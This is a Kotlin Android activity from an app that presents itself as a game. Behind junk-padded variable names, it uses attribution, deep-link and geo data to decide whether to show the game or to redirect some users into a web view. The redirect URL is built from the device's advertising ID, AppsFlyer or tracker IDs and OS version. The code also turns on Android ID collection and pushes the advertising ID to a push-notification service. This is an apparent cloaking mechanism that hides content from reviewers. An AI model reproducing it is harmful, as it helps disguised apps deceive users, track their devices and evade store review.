package com.kooapps.stackybirdandroidw.filerekika

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.kooapps.stackybirdandroidw.infiniti.InfluinitiActivity
import com.my.tracker.MyTracker
import com.onesignal.OneSignal
import com.kooapps.stackybirdandroidw.mamitaclasita.MadreClasses.Companion.pampampapapapapapapapa
import com.kooapps.stackybirdandroidw.R
import com.kooapps.stackybirdandroidw.gamamama.gameActivity.GamefiAct
import org.json.JSONException
import org.json.JSONObject


class PrequelMeNow : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filer_me_now)
        createURL()
    }

    fun pushToOS(id: String) {
        OneSignal.setExternalUserId(
            id,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccessweqkleqwklejwqe = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccessweqkleqwklejwqe"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccesswelqhqwjkhdd =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccesswelqhqwjkhdd"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccesskelfhqfhfkqwejfhqwjkfq = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccesskelfhqfhfkqwejfhqwjkfq"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    fun createURL() {
        val appsDataqweqweqweqweqweeqw = pampampapapapapapapapa["AppsData"]
        val depDataqweqweqwqweqwe = pampampapapapapapapapa["FBData"]
        val gaidqweqweqweqweasdasqwweqw = pampampapapapapapapapa["GAID"]
        val viewqweqwesdfwqe = pampampapapapapapapapa["View"]
        val geoHostqweqwdsqweqw = pampampapapapapapapapa["GeoHose"]
        val geoqweqw455weqwe = pampampapapapapapapapa["GEO"]
        val appsCheckwqeqweqwefdfgdtyrt = pampampapapapapapapapa["AppsCh"]
        val trackerParamsasdqgqwqewef = MyTracker.getTrackerParams()

        trackerParamsasdqgqwqewef.setCustomUserId(gaidqweqweqweqweasdasqwweqw)
        pushToOS(gaidqweqweqweqweasdasqwweqw.toString())


        val shPqweqwfqffqwef = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)

        val instIDqweqweqwdsdqwweqwe = MyTracker.getInstanceId(applicationContext)

        val afIdeqwdfjhfgh = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val buildVerseqwejkqwewhegqwjheqwe = Build.VERSION.RELEASE


        val sub1erwkjhrjkweh = "sub_id_1="
        val sub2qwekqwehqwejkqw = "ad_id="
        val sub3wqkejqwhejkqwh = "deviceID="
        val sub4weqwjkegk = "sub_id_4="
        val sub5qwejqwhkejqwh = "sub_id_5="
        val namqwejkqwhk = "naming"
        val deppqwekjqwhk = "orgdeep"
        val orgwqejkqheqjke = "organika"
        val deepeqwkjghegwweioqw = "deep"

        var linkqwejkhqwekqwj = ""

        when (appsCheckwqeqweqwefdfgdtyrt) {
            "1" ->
                if (appsDataqweqweqweqweqweeqw != "null") {
                    linkqwejkhqwekqwj =
                        "$viewqweqwesdfwqe$sub1erwkjhrjkweh$appsDataqweqweqweqweqweeqw&$sub3wqkejqwhejkqwh$afIdeqwdfjhfgh&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$namqwejkqwhk"
                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
                    startActivity(Intent(this, InfluinitiActivity::class.java))
                    finish()
                } else if (depDataqweqweqwqweqwe != null || geoHostqweqwdsqweqw!!.contains(geoqweqw455weqwe.toString())) {
                    linkqwejkhqwekqwj =
                        "$viewqweqwesdfwqe$sub1erwkjhrjkweh$depDataqweqweqwqweqwe&$sub3wqkejqwhejkqwh$afIdeqwdfjhfgh&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$deppqwekjqwhk"
                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
                    startActivity(Intent(this, InfluinitiActivity::class.java))
                    finish()
                } else {
                    startActivity(Intent(this, GamefiAct::class.java))
                    finish()
                }
            "0" ->
                if (depDataqweqweqwqweqwe != null) {
                    linkqwejkhqwekqwj =
                        "$viewqweqwesdfwqe$sub1erwkjhrjkweh$depDataqweqweqwqweqwe&$sub3wqkejqwhejkqwh$instIDqweqweqwdsdqwweqwe&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$deepeqwkjghegwweioqw"
                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
                    startActivity(Intent(this, InfluinitiActivity::class.java))
                    finish()
                } else if (geoHostqweqwdsqweqw!!.contains(geoqweqw455weqwe.toString())) {
                    linkqwejkhqwekqwj = "$viewqweqwesdfwqe$sub3wqkejqwhejkqwh$instIDqweqweqwdsdqwweqwe&$sub2qwekqwehqwejkqw$gaidqweqweqweqweasdasqwweqw&$sub4weqwjkegk$buildVerseqwejkqwewhegqwjheqwe&$sub5qwejqwhkejqwh$orgwqejkqheqjke"
                    shPqweqwfqffqwef.edit().putString("link", linkqwejkhqwekqwj).apply()
                    shPqweqwfqffqwef.edit().putString("ENTRY_CODE", "web").apply()
                    startActivity(Intent(this, InfluinitiActivity::class.java))
                    finish()
                } else {
                    startActivity(Intent(this, GamefiAct::class.java))
                    finish()
                }
        }
    }
}
